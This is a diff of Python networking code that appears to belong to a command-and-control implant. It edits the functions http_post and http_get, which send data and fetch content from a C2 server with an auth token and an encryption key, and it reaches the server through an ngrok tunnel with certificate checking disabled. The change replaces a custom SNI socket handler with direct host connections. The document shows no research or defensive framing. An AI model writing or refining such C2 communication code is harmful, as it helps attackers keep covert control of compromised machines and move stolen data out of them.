@@ -209,24 +209,13 @@ def http_post(path, data, c2_url=None, auth_token=None, enc_key=None):
     c2_ip, c2_host = _resolve_c2_ip(c2_url)
     
     if c2_ip and c2_host:
-        # Use IP with SNI hostname for ngrok
-        class SNIHTTPSHandler(HTTPSHandler):
-            def https_open(self, req):
-                return self.do_open(self._connection_factory, req)
-            def _connection_factory(self, host, port, timeout=15):
-                sock = socket.create_connection((c2_ip, 443), timeout=timeout)
-                ctx_wrap = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                ctx_wrap.check_hostname = False
-                ctx_wrap.verify_mode = ssl.CERT_NONE
-                ssock = ctx_wrap.wrap_socket(sock, server_hostname=c2_host)
-                return ssock
-        
+        # Use IP with SNI hostname for ngrok - simple approach
         headers["Host"] = c2_host
-        req = Request(f"https://{c2_ip}{path}", data=body.encode(), headers=headers)
+        req = Request(f"https://{c2_host}{path}", data=body.encode(), headers=headers)
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
-        opener = build_opener(SNIHTTPSHandler(context=ctx))
+        opener = build_opener(HTTPSHandler(context=ctx))
     else:
         # Fallback to normal URL
         ctx = ssl.create_default_context()
@@ -262,23 +251,13 @@ def http_get(path, c2_url=None, auth_token=None, enc_key=None, timeout=10):
     c2_ip, c2_host = _resolve_c2_ip(c2_url)
     
     if c2_ip and c2_host:
-        class SNIHTTPSHandler(HTTPSHandler):
-            def https_open(self, req):
-                return self.do_open(self._connection_factory, req)
-            def _connection_factory(self, host, port, timeout=15):
-                sock = socket.create_connection((c2_ip, 443), timeout=timeout)
-                ctx_wrap = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                ctx_wrap.check_hostname = False
-                ctx_wrap.verify_mode = ssl.CERT_NONE
-                ssock = ctx_wrap.wrap_socket(sock, server_hostname=c2_host)
-                return ssock
-        
+        # Use simple approach - direct connection
         headers["Host"] = c2_host
-        req = Request(f"https://{c2_ip}{path}", headers=headers)
+        req = Request(f"https://{c2_host}{path}", headers=headers)
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
-        opener = build_opener(SNIHTTPSHandler(context=ctx))
+        opener = build_opener(HTTPSHandler(context=ctx))
     else:
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
